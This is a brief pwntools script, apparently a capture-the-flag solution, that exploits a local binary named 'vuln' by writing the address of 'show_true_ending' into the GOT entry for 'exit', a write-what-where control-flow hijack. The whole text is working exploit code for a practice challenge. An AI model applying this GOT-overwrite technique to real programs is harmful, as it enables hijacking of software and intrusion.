from pwn import *

e = ELF('./vuln')
p = process('./vuln')

p.sendline(str(e.got["exit"]).encode("ascii")) #where
p.sendline(str(e.symbols["show_true_ending"]).encode("ascii")) #what